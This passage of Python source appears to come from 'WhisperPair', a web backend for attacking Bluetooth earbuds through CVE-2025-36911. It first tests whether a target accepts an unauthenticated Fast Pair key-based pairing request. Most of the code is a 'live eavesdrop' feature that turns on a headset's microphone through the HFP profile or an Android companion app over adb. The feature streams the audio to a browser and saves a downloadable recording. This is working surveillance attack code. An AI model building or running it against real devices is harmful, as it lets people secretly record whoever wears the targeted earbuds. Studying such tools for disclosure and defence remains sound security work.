                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)
                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"[TEST] KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break
            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"[TEST] KBP rejected ({strategy_name})", "error")
                else:
                    stage("kbp_request", f"[TEST] KBP failed ({strategy_name}): {e}", "error")
                await asyncio.sleep(1)

        # Step 5: Determine result (no account key, no pairing)
        if br_edr_address:
            result["br_edr_address"] = br_edr_address

        if kbp_accepted:
            result["success"] = True
            result["message"] = "TEST COMPLETE: Device is VULNERABLE to CVE-2025-36911 (no exploit performed)"
            stage("complete", result["message"], "success")
        else:
            result["message"] = "TEST COMPLETE: Device appears patched"
            stage("complete", result["message"], "error")

        result["notifications"] = notifications
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass


# ==============================================================================
# LIVE EAVESDROP
# ==============================================================================

last_eavesdrop_file = None
eavesdrop_logcat = None
eavesdrop_proc = None  # For laptop mode parecord process


@app.route("/api/eavesdrop/download")
def download_eavesdrop():
    if last_eavesdrop_file and os.path.exists(last_eavesdrop_file):
        return send_file(last_eavesdrop_file, as_attachment=True,
                         download_name="eavesdrop_recording.wav")
    return jsonify({"error": "No recording available"}), 404


@socketio.on("eavesdrop:start")
def handle_eavesdrop_start(data):
    mode = data.get("mode", "phone")
    if mode == "laptop":
        handle_eavesdrop_laptop(data)
    else:
        handle_eavesdrop_phone(data)


def handle_eavesdrop_laptop(data):
    """Record from BT mic using PipeWire on the laptop."""
    global last_eavesdrop_file, eavesdrop_proc

    address = data.get("address")
    if not address:
        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No target address", "status": "error"})
        return

    def run_laptop_eavesdrop():
        global last_eavesdrop_file, eavesdrop_proc

        socketio.emit("eavesdrop:status", {
            "stage": "launching",
            "message": "Finding Bluetooth audio source...",
            "status": "running",
        })

        # Find BT audio source via wpctl / pw-cli
        bt_source = None
        addr_nodash = address.replace(":", "_")

        result = subprocess.run(
            ["wpctl", "status"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            if "bluez" in line.lower() and "source" in line.lower().split("bluez")[0]:
                # Extract node ID
                stripped = line.strip()
                if stripped and stripped[0].isdigit():
                    node_id = stripped.split(".")[0].strip()
                    bt_source = node_id
                    break

        # If no source found, try setting HFP profile first
        if not bt_source:
            socketio.emit("eavesdrop:status", {
                "stage": "launching",
                "message": "Switching to HFP profile for mic access...",
                "status": "running",
            })
            # Find bluez card in wpctl and set to headset profile
            in_audio = False
            for line in result.stdout.splitlines():
                if "Audio" in line:
                    in_audio = True
                if in_audio and "bluez" in line.lower():
                    stripped = line.strip()
                    if stripped and stripped[0].isdigit():
                        card_id = stripped.split(".")[0].strip()
                        subprocess.run(
                            ["wpctl", "set-profile", card_id, "1"],  # headset-head-unit
                            capture_output=True, text=True, timeout=5,
                        )
                        time.sleep(2)
                        break

            # Retry
            result2 = subprocess.run(["wpctl", "status"], capture_output=True, text=True, timeout=5)
            for line in result2.stdout.splitlines():
                if "bluez" in line.lower() and ("source" in line.lower() or "input" in line.lower()):
                    stripped = line.strip()
                    if stripped and stripped[0].isdigit():
                        bt_source = stripped.split(".")[0].strip()
                        break

        if not bt_source:
            socketio.emit("eavesdrop:status", {
                "stage": "error",
                "message": "No Bluetooth audio source found. Make sure the device is connected with HFP profile.",
                "status": "error",
            })
            return

        socketio.emit("eavesdrop:status", {
            "stage": "recording",
            "message": f"LIVE — recording from BT source (node {bt_source})",
            "status": "running",
        })

        # Record to WAV file
        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")

        # pw-record saves to file; pw-cat streams to stdout
        rec_proc = subprocess.Popen(
            ["pw-record", "--channels=1", "--rate=8000", "--format=s16", local_path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        eavesdrop_proc = rec_proc

        # Stream raw PCM to browser via pw-cat
        stream_proc = subprocess.Popen(
            ["pw-cat", "--record", "--channels=1", "--rate=8000", "--format=s16"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

        start_time = time.time()

        try:
            while rec_proc.poll() is None:
                chunk = stream_proc.stdout.read(4096)
                if not chunk:
                    break

                socketio.emit("eavesdrop:audio", {
                    "pcm": base64.b64encode(chunk).decode("ascii"),
                    "rate": 8000,
                    "channels": 1,
                    "bits": 16,
                })

                # VU meter
                elapsed = int(time.time() - start_time)
                ts = f"{elapsed // 60:02d}:{elapsed % 60:02d}"
                max_amp = 0
                for i in range(0, len(chunk) - 1, 2):
                    s = abs(int.from_bytes(chunk[i:i+2], 'little', signed=True))
                    if s > max_amp:
                        max_amp = s
                bars = min(max_amp // 500, 20)
                vu = "\u2588" * bars + "\u2591" * (20 - bars)
                socketio.emit("eavesdrop:status", {
                    "stage": "recording",
                    "message": f"{ts} {vu} {max_amp}",
                    "status": "running",
                })
        finally:
            if stream_proc.poll() is None:
                stream_proc.terminate()
            if rec_proc.poll() is None:
                rec_proc.terminate()
                rec_proc.wait(timeout=5)
            eavesdrop_proc = None

        if os.path.exists(local_path):
            size = os.path.getsize(local_path)
            last_eavesdrop_file = local_path
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": f"Recording saved — {size // 1024}KB captured from BT mic.",
                "status": "success",
                "download_url": "/api/eavesdrop/download",
            })
        else:
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": "Eavesdrop stopped.",
                "status": "warning",
            })

    thread = threading.Thread(target=run_laptop_eavesdrop, daemon=True)
    thread.start()


def handle_eavesdrop_phone(data):
    global last_eavesdrop_file, eavesdrop_logcat

    device_id = data.get("device_id") or selected_adb_device
    address = data.get("address")

    if not device_id:
        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No ADB phone connected", "status": "error"})
        return
    if not address:
        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No target address", "status": "error"})
        return

    def run_live_eavesdrop():
        global last_eavesdrop_file, eavesdrop_logcat

        subprocess.run(["adb", "-s", device_id, "logcat", "-c"],
                       capture_output=True, text=True, timeout=5)

        socketio.emit("eavesdrop:status", {
            "stage": "launching",
            "message": f"Opening live eavesdrop on {address}...",
            "status": "running",
        })

        # Launch eavesdrop activity
        result = subprocess.run(
            ["adb", "-s", device_id, "shell", "am", "start",
             "-a", "com.whisperpair.EAVESDROP",
             "--es", "address", address],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            socketio.emit("eavesdrop:status", {
                "stage": "error",
                "message": f"Failed to launch: {result.stderr.strip()}",
                "status": "error",
            })
            return

        # Set up ADB port forwarding for audio stream
        subprocess.run(
            ["adb", "-s", device_id, "forward", "tcp:19876", "tcp:19876"],
            capture_output=True, text=True, timeout=5,
        )

        # Start logcat monitor
        eavesdrop_stopping.clear()
        logcat_proc = subprocess.Popen(
            ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        eavesdrop_logcat = logcat_proc

        # Start audio stream reader in separate thread
        audio_thread = threading.Thread(target=stream_audio_to_browser, daemon=True)
        audio_thread.start()

        try:
            while logcat_proc.poll() is None and not eavesdrop_stopping.is_set():
                ready, _, _ = select.select([logcat_proc.stdout], [], [], 1.0)
                if not ready:
                    continue
                line = logcat_proc.stdout.readline().strip()
                if not line:
                    continue
                msg = line.split(":", 1)[-1].strip() if ":" in line else line

                if "EAVESDROP_VU" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "recording",
                        "message": msg.replace("EAVESDROP_VU ", ""),
                        "status": "running",
                    })
                elif "EAVESDROP_LIVE_STARTED" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "recording",
                        "message": "LIVE — streaming earbuds mic to browser",
                        "status": "running",
                    })
                elif "EAVESDROP_STOPPED" in msg:
                    break
                elif "SCO connected" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "recording",
                        "message": "SCO connected — mic active!",
                        "status": "running",
                    })
                elif "ERROR" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "error", "message": msg, "status": "error",
                    })
        finally:
            if logcat_proc.poll() is None:
                logcat_proc.terminate()
                logcat_proc.wait(timeout=5)
            eavesdrop_logcat = None

    thread = threading.Thread(target=run_live_eavesdrop, daemon=True)
    thread.start()


def stream_audio_to_browser():
    """Connect to the Android app's TCP audio stream and forward
    raw PCM chunks to the browser via Socket.IO."""
    time.sleep(3)  # Wait for the app to start the server

    try:
        s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("127.0.0.1", 19876))
        s.settimeout(1)
    except Exception as e:
        socketio.emit("eavesdrop:status", {
            "stage": "recording",
            "message": f"Audio stream: could not connect ({e})",
            "status": "warning",
        })
        return

    socketio.emit("eavesdrop:status", {
        "stage": "recording",
        "message": "Audio stream connected — playing in browser",
        "status": "running",
    })

    try:
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                # Send raw PCM as base64 to browser
                socketio.emit("eavesdrop:audio", {
                    "pcm": base64.b64encode(data).decode("ascii"),
                    "rate": 8000,
                    "channels": 1,
                    "bits": 16,
                })
            except sock.timeout:
                continue
            except Exception:
                break
    finally:
        s.close()


eavesdrop_stopping = threading.Event()


@socketio.on("eavesdrop:stop")
def handle_eavesdrop_stop():
    global eavesdrop_logcat, eavesdrop_proc
    device_id = selected_adb_device

    # Signal the logcat thread to stop
    eavesdrop_stopping.set()

    # Stop laptop mode recording if active
    if eavesdrop_proc and eavesdrop_proc.poll() is None:
        eavesdrop_proc.terminate()
        eavesdrop_proc = None

    socketio.emit("eavesdrop:status", {
        "stage": "stopping",
        "message": "Stopping eavesdrop...",
        "status": "running",
    })

    if device_id:
        # Send stop broadcast to the app
        subprocess.run(
            ["adb", "-s", device_id, "shell", "am", "broadcast",
             "-a", "com.whisperpair.STOP_EAVESDROP"],
            capture_output=True, text=True, timeout=5,
        )

        # Kill logcat monitor
        if eavesdrop_logcat and eavesdrop_logcat.poll() is None:
            eavesdrop_logcat.terminate()
            eavesdrop_logcat = None

        # Remove port forward
        subprocess.run(
            ["adb", "-s", device_id, "forward", "--remove", "tcp:19876"],
            capture_output=True, text=True, timeout=5,
        )

    # Pull recording in background
    def pull_recording():
        global last_eavesdrop_file
        time.sleep(2)

        if not device_id:
            return

        recording_file = "/storage/emulated/0/Android/data/com.whisperpair.companion/files/eavesdrop_live.wav"
        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")
        pull_result = subprocess.run(
            ["adb", "-s", device_id, "pull", recording_file, local_path],
            capture_output=True, text=True, timeout=15,
        )

        if pull_result.returncode == 0 and os.path.exists(local_path):
            size = os.path.getsize(local_path)
            last_eavesdrop_file = local_path
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": f"Recording saved — {size // 1024}KB captured from earbuds mic.",
                "status": "success",
                "download_url": "/api/eavesdrop/download",
            })
        else:
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": "Eavesdrop stopped.",
                "status": "warning",
            })

    threading.Thread(target=pull_recording, daemon=True).start()


if __name__ == "__main__":
    print("WhisperPair Web Interface - Backend")
    print("http://localhost:5000")
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)
